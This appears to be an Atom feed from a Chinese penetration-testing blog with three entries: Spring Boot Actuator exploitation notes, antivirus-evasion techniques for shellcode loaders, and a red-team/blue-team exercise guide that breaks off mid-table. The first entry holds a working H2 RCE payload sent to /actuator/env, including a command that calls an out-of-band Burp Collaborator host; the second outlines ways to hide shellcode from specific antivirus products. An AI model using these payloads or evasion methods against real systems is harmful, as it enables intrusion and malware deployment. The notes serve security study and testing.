<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mr.Frame</title>
  
  <subtitle>subtitle</subtitle>
  <link href="https://askding.github.io/atom.xml" rel="self"/>
  
  <link href="https://askding.github.io/"/>
  <updated>2021-11-15T12:55:56.230Z</updated>
  <id>https://askding.github.io/</id>
  
  <author>
    <name>Mr.Frame</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Spring</title>
    <link href="https://askding.github.io/Kali/Exploit/Spring.html"/>
    <id>https://askding.github.io/Kali/Exploit/Spring.html</id>
    <published>2021-11-15T12:55:56.230Z</published>
    <updated>2021-11-15T12:55:56.230Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>推荐资料：</p><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li><li><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></li><li><a href="https://www.cnblogs.com/cwkiller/p/12829974.html">Spring Boot Actuator H2 RCE复现</a></li></ul><ul><li><a href="https://www.jianshu.com/p/91a5ca9b7c1c">Spring Boot Actuator(eureka xstream deserialization RCE)</a></li></ul><p><strong>Spring</strong> 是为解决企业应用开发的复杂性而创建的一个开源框架。<br>    主要的设计思想是有两个：</p><ul><li><code>控制反转IOC</code><br>IOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。</li><li><code>面向方面编程AOP</code><br>利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">nmap -Pn -T4  -p 8080  -sV --version-all 192.168.79.28Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CSTNmap scan report for 192.168.79.28Host is up (0.00019s latency).PORT     STATE SERVICE    VERSION8080/tcp open  http-proxy</code></pre><p>访问不存在的页面包含以下信息证明使用了Spring Boot</p><pre><code class="html">Whitelabel Error PageThis application has no explicit mapping for /error, so you are seeing this as a fallback.Tue Dec 15 09:35:57 GMT 2020There was an unexpected error (type=Not Found, status=404).No message available</code></pre><p>Spring API信息获取</p><pre><code class="zsh">curl -v &#39;http://192.168.79.28:8080/trace&#39;  # 获取用户认证字段curl -v &#39;http://192.168.79.28:8080/env&#39;    # 服务器配置信息，包括数据库curl -v &#39;http://192.168.79.28:8080/health&#39;  # 泄漏git项目地址curl -v &#39;http://192.168.79.28:8080/heapdump&#39; # 泄漏后台用户信息curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;## Spring Boot Actuator H2 with HikariCP远程代码执行**Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。  Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/)```zsh curl  &#39;http://192.168.79.28:8080/actuator&#39;  # 查看actuator下的端点actuator/env&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;restart&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/restart&quot;,&quot;templated&quot;:false&#125;&#125;&#125;%</code></pre><p>发送EXP</p><pre><code class="json">POST /actuator/env HTTP/1.1content-type: application/json&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&#125;POST /actuator/restart HTTP/1.1content-type: application/json&#123;&#125;</code></pre><pre><code class="zsh">curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; --data-binary $&#39;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#39;,\&#39; java.util.Scanner(Runtime.getRun\&#39;,\&#39;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#39;);CALL EXEC(\&#39;curl http://x.burpcollaborator.net\&#39;);\&quot;&#125;&#39; &#39;http://192.168.79.28:8080/actuator/env&#39;#发送expcurl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://192.168.79.28:8080/actuator/restart&#39;   # 触发exp</code></pre><h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><ol><li>引入 security 依赖，打开安全限制并进行身份验证</li><li>设置单独的 Actuator 管理端口并配置不对外网开放</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;推荐资料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/LandGrey/S</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀思路</title>
    <link href="https://askding.github.io/Kali/PostExploit/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html"/>
    <id>https://askding.github.io/Kali/PostExploit/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html</id>
    <published>2021-09-25T06:06:46.000Z</published>
    <updated>2021-09-25T06:06:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="杀毒软件常见检测方法："><a href="#杀毒软件常见检测方法：" class="headerlink" title="杀毒软件常见检测方法："></a>杀毒软件常见检测方法：</h2><p>通常分为静态特征查杀和动态行为检测(包括沙箱)</p><ul><li><p>静态特征查杀，基于匹配特征码，与病毒库里面的md5进行比较。</p><pre><code> 做法：模糊哈希算法，机器学习跑模型 ， </code></pre><p>绕过：利用myccl工具查找定位复合特征码 或手工（单步查杀找到特征码）对特征码进行混淆处理</p></li><li><p>动态行为检测 ，沙箱执行可以程序 </p><pre><code> 做法：hook关键api，监控注册表启动项，系统文件，防止对其修改    绕过： 沙箱检测(检测线程数)，文件重命名检测 延时(类似cobaltstrike的睡眠机制，用钩子在睡眠时间内存权限设置读写，在非睡眠时改回可执行。)</code></pre></li></ul><h2 id="熟悉各个杀软的查杀特性"><a href="#熟悉各个杀软的查杀特性" class="headerlink" title="熟悉各个杀软的查杀特性"></a>熟悉各个杀软的查杀特性</h2><ul><li><p>火绒： 重点基于字符串去查杀，<br>做法：重点针对函数如regMovememory进行字符串混淆或更换函数</p></li><li><p>360： 重点基于函数具体触发的行为去查杀 <br>做法： 延时，沙箱检测，文件重命名检测</p></li><li><p>WinDefender： 重点基于特定位置，特征码去查杀   <br>做法：找特征码去混淆</p></li></ul><h2 id="针对各个杀软的特点进行自定义加载器"><a href="#针对各个杀软的特点进行自定义加载器" class="headerlink" title="针对各个杀软的特点进行自定义加载器"></a>针对各个杀软的特点进行自定义加载器</h2><p>免杀处理思路：</p><ol><li><p>源码免杀，（有源码时） 定位特征码，进行混淆<br>a)如内嵌汇编加载、内存免杀(渐进式申请一块内存，最后改为可执行)、分离免杀、二次编译、<br>b)隐藏IAT、强制类型转换、加花指令、多层跳转、加无效指令、替换/重写API、API伪调用等<br>c)shellcode进行异或 编码base64，AES加密等 </p></li><li><p>无源码免杀，在源码不好修改时，<br>a)resourceHacker资源修改、<br>b)vmp加壳、加签名、PE优化等组合使用</p></li><li><p>白名单exe/dll免杀-如rundll32、msbuild、mshta、cscript等</p></li><li><p>Powershell混淆绕过  – 根据powershell语言特性，字符串转换，变量转换，编码，压缩等</p></li><li><p>偏僻语言编写shellcode</p></li><li><p>加载器分离免杀</p></li></ol><h2 id="简述远程加载器分离免杀的思路比较好，实现代码逻辑"><a href="#简述远程加载器分离免杀的思路比较好，实现代码逻辑" class="headerlink" title="简述远程加载器分离免杀的思路比较好，实现代码逻辑"></a>简述远程加载器分离免杀的思路比较好，实现代码逻辑</h2><p>  规避网络测绘-&gt;shellcode混淆-&gt;beacon去特征<br>大体思路：<br>Winhttp库或window sockets实现http请求（cs使用winInet库） –&gt; 存在问题：容易暴露自己C2和文件服务器地址(域前置解决)<br>对shellcode进行AES动态加密</p><ul><li>服务器<br>用netty框架，采用select多客户端模型 写一个web服务器，获取请求发过来的key值，用key对shellcode进行加密，响应给客户端</li><li>客户端（C++加载器）</li></ul><ol><li>每次请求shellcode时随机生成一个key值，通过http请求将key发送到服务器</li><li>服务器使用key对shellcode进行AES加密或shellcode每一位与key进行异或操作，响应给客户端</li><li>用cryptopp库进行AES解密shellcode，virtualAlloc采用渐进式申请内存空间，使用memcpy拷贝shellcode到内存中，最后调用这个内存地址</li></ol><p>甚至可以将loader是否也可以尝试一下，客户端仅保留下载loader和shellcode的功能</p><p>shellcode生成工具-donut，对Execute-Assembly进一步利用，将exe,dll,vbs,js转成shellcode<br>shellcode混淆器-Obfuscator<br>修改加载器特征<br>加载器特征= A「shellcode+硬编码字符串」 + B 「virtualAlloc，virtualProtect函数」</p><p>修改方法：<br>          对A进行 base64编码+加密（如xor）(更安全)，   <br>         对B插入花指令(无意义代码)， 可以使用HeapAlloc替换virtualAlloc函数<br>修改加载器的特征</p><p>对<code>func_get_delegate_type</code>，<code>func_get_proc_address</code>两个函数重命名替换，对函数里面的一些变量进行重新定义</p><h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode加载器=S_0「shellcode_downloader」+ S_1「donwlod+run_shellcode」<br>通常杀软只检测一个进程的行为，<br>做法： 使用windows管道，socket通道<br>分离免杀，将shellcode写入到文件中和加载器分离开，在加载器启动执行时再将shellcode从文件当中读取进来。</p><h3 id="修改资源"><a href="#修改资源" class="headerlink" title="修改资源"></a>修改资源</h3><p>杀软会检测文件的描述，版本号，创建日期作为特征检测<br>做法： 使用restorator对目标修改资源文件</p><h3 id="隐藏IAT"><a href="#隐藏IAT" class="headerlink" title="隐藏IAT"></a>隐藏IAT</h3><p>杀软检测导入表中是否存在可疑函数<br>做法： opt1 调用getProcessAddress获取所需函数地址<br>opt2  用汇编从Teb里找到kernel32.dll地址，再从其导出表中获取所需系统函数</p><h2 id="msf与cs的stager对比分析"><a href="#msf与cs的stager对比分析" class="headerlink" title="msf与cs的stager对比分析"></a>msf与cs的stager对比分析</h2><p>  相同点： 通过WinInet系列函数远程加载stage并使用VirtualAlloc为其分配一块rwx的内存空间，最后转去执行stage<br>  不同点： cs比msf多调用几个函数 InternetErrorDlg, GetDesktopWindow, GetLastError</p><h3 id="payload加载方式基本一致-cs参考msf，都支持stager和stageless方式加载"><a href="#payload加载方式基本一致-cs参考msf，都支持stager和stageless方式加载" class="headerlink" title="payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)"></a>payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)</h3><p>meterpreter加载顺序：stager-&gt;metsrv.dll-&gt;stdapi.dll<br>           cs-beacon加载顺序： stgaer-&gt;beacon.dll</p><h3 id="C2实现方式："><a href="#C2实现方式：" class="headerlink" title="C2实现方式："></a>C2实现方式：</h3><pre><code>   meterpreter的handler实现：TCPServer结合resources实现的简易HTTP服务   Beacon的Listener实现：基于NanoHTTPD实现(成熟稳定)</code></pre><h3 id="通信协议上差异："><a href="#通信协议上差异：" class="headerlink" title="通信协议上差异："></a>通信协议上差异：</h3><pre><code>cs和msf均使用http/s进行数据通信，但具体传输方式上有差异    meterpreter使用HTTP 1.1 ，默认使用keep-alive功能，且不能关闭 （不稳定）    Beacon使用HTTP 1.1 ，但默认不开启keep-alive功能 且支持抖动特性</code></pre><p>具体的表现为在实际使用过程中,Meterpreter与C2服务器始终保持一条TCP连接,且对TCP连接的状态没有监控. 相对应的Beacon在请求任务/返回结果时会与C2建立连接,而在sleep阶段与C2没有网络连接. </p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;杀毒软件常见检测方法：&quot;&gt;&lt;a href=&quot;#杀毒软件常见检测方法：&quot; class=&quot;headerlin</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>红蓝对抗</title>
    <link href="https://askding.github.io/Kali/PostExploit/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97.html"/>
    <id>https://askding.github.io/Kali/PostExploit/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97.html</id>
    <published>2021-09-23T02:37:34.000Z</published>
    <updated>2021-09-23T02:37:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><ul><li>红蓝对抗<br>组织 <em>多支攻击队伍</em>  对 <em>各行业重点点位目标系统</em> 进行集中攻击，检验防守方的防护能力，通过预判的规则，以积分形式确定双方的排名。</li></ul><ul><li><p>攻击者(经授权的国家科研机构、安全公司/团队)</p></li><li><p>防守方(系统运营单位、其他协同防护主体)</p></li><li><p>裁判组(组织方、第三方权威机构)</p></li><li><p><input disabled="" type="checkbox">  得分场景</p><ol><li>积极配合应急组工作，根据线索能快速准确定位受害系统，能提供充分的日志记录，配合执法机关固定证据完成勘验发现木马攻击</li><li>发现漏洞攻击，记录完整的攻击路径，并需触发响应的应急处置流程</li><li>处置Webshell木马或主机木马程序，并需触发响应的应急处置流程</li><li>处置主机异常新增账户，处置被爆破账户密码，并需触发响应的应急处置流程</li><li>处置Web系统、FTP等异常新增账户，处置被爆破账户密码消除其他威胁</li><li>发现钓鱼攻击，快速定位钓鱼样本，并提交样本分析报告</li><li>发现社会工程攻击，上报攻击者有效个人信息(职位、姓名、电话、公司)等</li><li>发现并成功溯源攻击者，上报攻击者有效信息(IP、设备信息、个人信息)</li><li>发现并成功反制攻击者，控制攻击者主机及网络环境</li></ol></li><li><p><input disabled="" type="checkbox">  失分场景</p><ol><li>被获取域控服务器权限</li><li>被获取路由器、交换机、防火墙等网络设备权限</li><li>被获取Web应用系统服务器、邮件服务器、数据库服务器等权限</li><li>被获取业务内网邮箱、FTP应用、Web应用系统、数据库远程访问、互联网VPN接入系统的账户密码</li><li>被获取Webshell权限</li><li>被获取终端计算机权限</li><li>被获取其他设备权限</li></ol></li></ul><p>** 攻击队<br>基本攻击思路</p><ol><li>主要资产正面突破<br>此路径系统漏洞相对较少，防护设备与安全措施相对更严密，攻击难度大且易被察觉，但由于资产重要程度较高，有所突破能有较大收益</li><li>边缘资产迂回突破<br>此处防御相对薄弱，监控缺失，攻击难度较小，但若要进一步入侵核心层，往往还需要多次横向和纵向的扩展</li><li>第三方侧面入侵<br>利用上下游公司、外包开发商等与企业的网络具有关联性的机构，攻击者可通过首先入侵第三方，再扩展到企业，从而达到侧面入侵的目的</li><li>以人为突破口<br>瞄准安全意识薄弱的员工进行钓鱼等社工，可以广撒网，也可以精准打击运维等具有管理权限的员工</li><li>利用联网的硬件入侵<br>通过联网的设备，利用网络互联、隔离不够等防护脆弱点，实现目标的迂回攻击</li></ol><p>*** 初始信息收集<br>攻击者搜集关于目标组织的人员信息、组织架构、网络资产、技术框架及安全措施信息，后期这些信息将为攻击决策提供支撑。<br>收集信息的种类报告但不限于分支机构、关联公司、外包公司、投资公司、人员、网络、主机、域名、账户、邮箱等信息。<br>可进行收集信息的公开渠道：</p><p>| 天眼查 | 企查查 | 搜索引擎 | 社交网络  | ICP备案库 | 社工库  |<br>| Fofa   | Shodan | 官网     | 主/子域名 | BGP归属   | Zoomeye |</p><p>自动化工具常用来实现对攻击目标资产的持续跟踪，并对临时增加的资产，进行蜜罐识别探测<br>识别资产指纹，记录攻击目标资产的更详细类型，如CMS、第三方系统、组件、中间件等，以便对应到可进行利用的漏洞<br>收集攻击目标所涉及核心人员的全面信息，包括线上、社工，钓鱼等</p><p>通过自动化工具结合人工操作，持续进行信息搜集和扫描查点工作，长用手段:<br>| 高频探测     | 口令爆破、重放攻击、爬虫扫描、信息抓取 |<br>|————–+—————————————-|<br>| 敏感文件探测 | SVN泄露、Git泄露、备份文件泄露         |<br>| 敏感端口探测 | 22、3306、7001、6379、8080等           |<br>| 敏感路径探测 | 网站后台、未授权页面                   |<br>| 信息劫持攻击 | 中间人劫持、DNS劫持                    |</p><p>*** 选择攻击方案<br>对基础信息进行分析后，确认出关键任务，关键系统，边缘系统，物理地址等信息，攻击成员分工领取攻击任务，<br>方案包括：物理入侵、钓鱼邮件、Wi-Fi入侵、边缘资产渗透、互联网边界突破</p><p>*** 初始入侵<br>利用搜集到的信息，自动化攻击工具、漏洞储备资源、计算资源能力，通过利用安全意识漏洞、Nday和0day进行攻击，突破到内网区域<br>一般会先采用自动化工具进行第一波突破，若无果，再采用遍历攻击面的方式，逐个系统人工深入挖掘漏洞。</p><p>WAF对抗/IPS对抗  –&gt; EDR绕过/补丁绕过  –&gt; 漏洞利用/Webshell</p><ul><li>扫描器产出漏洞深入利用</li><li>利用员工账户爆破VPN系统</li><li>上传Webshell进一步获取控制权</li><li>OA系统/邮箱/VPN人工尝试登陆</li><li>尝试绕过WAF利用漏洞</li><li>人工注册业务系统账号挖掘漏洞</li></ul><p>*** 站稳脚跟<br>通过特定的工具，利用初始入侵得到的突破口，建立好进入内网的通道，同时做好隐蔽防止被发现，能稳定在内网立足</p><p> 通过虚拟机攻击云管理平台，利用管理平台控制所有机器<br>通过直接从虚拟机进行逃逸，从而控制宿主机，然后利用宿主机控制其上所有虚拟机</p><p>*** 权限提升<br>通过内核提权、不安全服务等各类手段，将攻击者的权限进行一定的提升，甚至到最高权限，一边进一步操作</p><p>*** 内部信息收集<br>利用新的立足点，进行内网的信息收集，包括内网的网络结构，脆弱服务，用户账户密码等，为下一步行动做准备</p><p>*** 横向移动<br>结合之前搜集的信息，在通过特定漏洞和工具进行横向移动，扩展到新的位置。<br>定向攻击核心目标，通过内网横向渗透，获取到更多的服务器控制权，更多的管理员信息，更多人的密码。<br>如DevOps发布系统，Jenkins/Git/SVN代码仓库、堡垒机、跳板机、开发运维、开发环境权限</p><p>*** 权限维持<br>扩展到新位置后，利用工具稳定攻击者权限，使能够立足在内网新位置</p><p>   *** 完成目标<br>通过不断的权限提升-内部信息收集-横向移动-维持权限这个循环，逐步靠近目标，最终完成目标</p><p>** 防守队</p><p>P2DR模型：是机遇策略的模型</p><ul><li><p>Policy: 策略是模型的核心，所有的防护、检测和响应都是依据安全策略实施的</p></li><li><p>Protection: 防护是根据系统可能出现的安全问题而采取的预防措施。采用的防护技术包括数据加密、身份认证、访问控制、授权和VPN技术、防火墙、安全扫描和数据备份等</p></li><li><p>Detection: 当攻击者穿越防护系统时，检测功能就发挥作用，与防护系统形成互补，检测是动态响应的依据</p></li><li><p>Response: 系统一旦检测到入侵，响应系统就开始工作，进行事件处理。</p></li><li><p>重点： 预防<br>尽可能全面理清攻击面、清理外网泄露的敏感信息，同时对资产进行相关的测试及加固</p></li><li><p>基础：检测与监测<br>明晰内外部资产状态，通过各类检测、监测的安全设备实时发现攻击痕迹，快速定位，为后续响应及溯源提供信息和证据</p></li><li><p>狙击手段：响应<br>建立完善的应急响应流程，<br>快速判断及处理未成功攻击，极致运用自动化体系减少防守人员的精力消耗<br>准备常见应急方案，快速联动处理突发情况，做到快速发现、定位分析、响应处置</p></li><li><p>得分手段：溯源<br>利用技术手段还原攻击者攻击首发，定位身份<br>通过攻击中暴漏的IP/域名或其他信息，结合威胁情报及相关渠道还原其画像，追溯到真人<br>通过部署内外网蜜罐等手段，主动诱捕在进行信息搜集/打算入侵的攻击者</p></li></ul><p>*** 常态化资产安全管理</p><ol><li><p>互联网资产测绘与检测<br>对互联网资产暴露面、互联网敏感信息泄露、互联网暴露的高危漏洞、端口和弱口令进行全面检测，并提供应急响应漏洞通告，帮助企业全面梳理互联网资产暴露风险</p></li><li><p>借助资产管理功能的安全产品<br>资产安全管理平台、主机安全管理平台</p></li><li><p>人工盘点、跟踪、核查与确认<br>梳理防火墙配置、回收老旧资产、登记新上资产<br>对主要供应链进行梳理如VPN品牌、OA/邮件供应商、系统框架组件</p></li><li><p>效果：<br>发现异常IP告警：5mins内，定位到该IP对应的资产在网络位置及物理位置，并可在技术上完成资产封堵<br>新爆发0day： 5mins内排查影响，定位受影响的资产并实施封堵</p></li></ol><p>重大保障期间：加强对互联网暴露资产进行周期性安全巡检:<br>；| 检查项                 | 内容                                                                               |<br>|————————+————————————————————————————|<br>| 互联网暴露面资产巡检   | 建立完整的互联网暴露面资产地图，包括外网全量自域名、外网全量端口指纹、外网Web指纹  |<br>| 互联网敏感信息监控     | 定期扫描企业在Github、码云、百度文库等高风险暴露渠道的信息泄露风险                 |<br>| 高危端口弱口令周期扫描 | 基于企业特点定制化弱口令集，对高危端口(SSH、MySQL、RDP、MSSQL等)进行周期弱口令探测 |<br>| 常见高危漏洞周期扫描   | 对常见高危漏洞进行周期扫描                                                         |<br>| 应急漏洞响应通告       | 结合企业暴露面资产指纹，获取互联网新增高危应急漏洞、云上捕获等情报                 |</p><ul><li>防守工作最佳实战指南</li></ul><p>** 全面检测<br>*** 网络架构分析<br>主要针对企业网络拓扑结构、安全域划分、网络访问控制规则、网络攻击路径进行调研和分析存在的网络安全问题，明确网络安全现状、为后期测试、防护加固提供方向</p><p>| 任务             | 工作内容                                                                                                         |<br>|——————+——————————————————————————————————————|<br>| 网络拓扑结构     | 通过访谈调研与工具探测，分析服务器、安全设备、网络设备、IP地址之前的关系，绘制网络拓扑                           |<br>| 安全域划分       | 根据企业拓扑结构及人员访谈，明确安全域的名称及作用、访问控制策略、安全管理措施                                   |<br>| 网络访问控制规则 | 明确域间及域内访问控制关系，梳理防火墙ACL列表及NAT列表｜                                                         |<br>| 网络攻击路径分析 | 基于实战经验梳理常见网络攻击路径，梳理内、外网易受攻击资产，互联网纵向攻击、内部网络横向攻击、集权类系统风险评估 |<br>| 入侵防护分析     | 根据网络拓扑及攻击面，梳理入侵防护现状、安全措施、安全设备覆盖度                                                 |</p><p>*** 资产梳理<br>开展资产梳理工作最好从</p><ul><li>调研[fn::人工进行访谈、调研、不间断判断、跟踪、核查与确认，确保防火墙配置、回收老旧资产、登记新资产等信息]</li><li>工具检索[fn:: 使用网络扫描等手段进行资产测绘]</li></ul><p>| 任务 | 工作内容                                                                                                                 |<br>|——+————————————————————————————————————————–|<br>| 区域 | 互联网区、办公区、生产区、开发测试区、大数据区、外联区                                                                   |<br>| 范围 | 业务系统、应用系统、办公系统、数据库、中间件、服务器、存储设备、网络设备、安全设备、网络拓扑结构                         |<br>| 纬度 | IP、域名、开放端口、服务、编号、用途、版本、型号、数据、操作系统、使用状态、账户、弱口令、通信方式、资产负责人、联系方式 |</p><p>未知资产： 企业内未确认归属、违规对互联网开放的资产,包括：</p><ul><li>公网IP地址</li><li>端口服务</li><li>Web应用</li><li>管理后台等</li></ul><p>*** 安全意识培训</p><p>| 层面       | 内容                                                         |<br>|————+————————————————————–|<br>| 政策背景   | 攻防演练活动国家、行业政策、验证体系介绍、攻防演练活动发展史 |<br>| 行业事件   | 行业内发生的安全事件解读、安全事件总结与防范措施建议         |<br>| 演练必要性 | 安全威胁演变趋势及影响，攻防演练行动解决的问题及收益         |</p><p>*** 基线评估</p><ul><li>内网基线评估 ：内网基线配置检查、漏洞扫描以内网基线扫描和应用及系统升级为主</li><li>外网基线评估 ：外网基线配置检查、漏洞扫描以Web安全基线，和Web漏洞为主</li></ul><p>*** 渗透测试</p><ol><li>内网渗透测试 ： 针对靶标系统、业务系统、域控、集中管控平台进行渗透测试</li><li>外网渗透测试 ： 针对所有暴露于互联网的应用和主机进行渗透测试</li></ol><ul><li><p>Web服务安全检测：<br>对支持Web业务稳定运行的服务进行安全检测，包括常见系统服务、常见容器组件、业务框架、业务相关支撑系统，<br>如SSH、RDP、FTP、数据库等服务，Weblogic、Tomcat、Jboss、Websphere容器、Structs2、Spring、ThinkPHP框架，<br>常见的检测项如弱口令检测、安全性配置测试、系统/服务版本检测、后门检测与排查</p></li><li><p>Web应用安全检测：<br>对被测业务功能进行安全检测，包括SQL注入、代码注入、XSS、CSRF、SSRF、XXE、越权、逻辑漏洞、文件包含、文件上传、任意文件读取、验证码安全等</p></li></ul><p>*** 客户端检测<br>通过逆向分析对APP和PC端自身安全性进行测试，包括对客户端本地存储安全、加密算法安全、加密协议安全、接口安全性等</p><p>** 专项评估<br>*** 弱口令专项评估<br>| 评估方法           | 评估范围                                                                | 评估内容                           | 解决问题                                             |<br>|——————–+————————————————————————-+————————————+——————————————————|<br>| 手动猜测、工具扫描 | 互联网区、办公区、DMZ区、针对员工OA邮箱等系统、运维人员管理口令及服务器 | 是否存在弱口令、多设备使用同一口令 | 弱口令检测以低成本方式结局最易产生严重危害的安全问题 |</p><p>*** 敏感信息专项评估<br>| 评估方法                                       | 评估内容                                                                                              | 解决问题                             |<br>|————————————————+——————————————————————————————————-+————————————–|<br>| 搜索引擎、网盘、代码托管平台、企业信息查询平台 | 未知资产(公网IP、端口服务、Web应用、管理后台等)、上传源码、内部文档资料、高层及开发人员个人信息IP地址 | 减少企业信息泄露，缩减企业资产暴露面 |</p><p>*** 邮件专项评估</p><ol><li>钓鱼邮件评估 ： 模拟真实钓鱼邮件对人员安全意识进行测试</li><li>邮箱安全评估 ：对影响邮件安全的威胁因素进行专项检测<ul><li><input disabled="" type="checkbox"> 基线检测 是否过滤垃圾邮件、开启SPF、安全审计、安全网关、配置二次认证、是否存在弱口令</li><li><input disabled="" type="checkbox"> 漏洞检测 根据邮件版本匹配Nday漏洞</li></ul></li></ol><p>*** 办公OA专项评估<br>| 任务         | 内容                                         |<br>|————–+———————————————-|<br>| 应用漏洞     | 检测OA系统是否存在Nday漏洞                   |<br>| 服务器       | 调研OA系统部署服务器所在安全区域             |<br>| 身份认证     | 认证方式、复杂度、登陆区域限制               |<br>| 权限管控     | 权限管控是否按照最小必须原则、账户是否一对一 |<br>| 数据泄露风险 | 办公OA系统涉及的人员数据、流程涉及敏感信息   |</p><p>*** VPN专项评估<br>| 任务         | 工作内容                                                               |<br>|————–+————————————————————————|<br>| 弱口令       | 根据定制化密码本检测企业VPN弱口令                                      |<br>| 身份认证     | 验证是否采用双因素认证、或同一身份认真系统                             |<br>| 账户权限管控 | 检查账户分配是否合理、是否按照最小必须原则、是否一人存多号、一号对多人 |<br>| 移动终端限制 | 检测是否存在移动终端拨入、建议攻防期间禁用                             |<br>| 0Day检测     | “军火商”VPN 0Day检测                                                   |<br>| 接入跳转     | 调研接入后可跳转区域，掌握VPN被攻破后受影响范围                        |</p><p>*** 无线Wi-Fi专项评估[fn::禁止私建热点、攻防期间停用Wi-Fi]<br>| 任务                 | 工作内容                                                                                |<br>|———————-+—————————————————————————————–|<br>| Wi-Fi登陆控制        | 在未连接上Wi-Fi时，尝试通过弱口令检测连接Wi-Fi                                          |<br>| 未更新的固件         | 连上Wi-Fi， 查看路由器固件版本，使用Nday进行攻击                                        |<br>| 路由器管理口台弱口令 | 在连接Wi-Fi时，尝试弱口令登陆路由器后台                                                 |<br>| Wi-Fi劫持            | 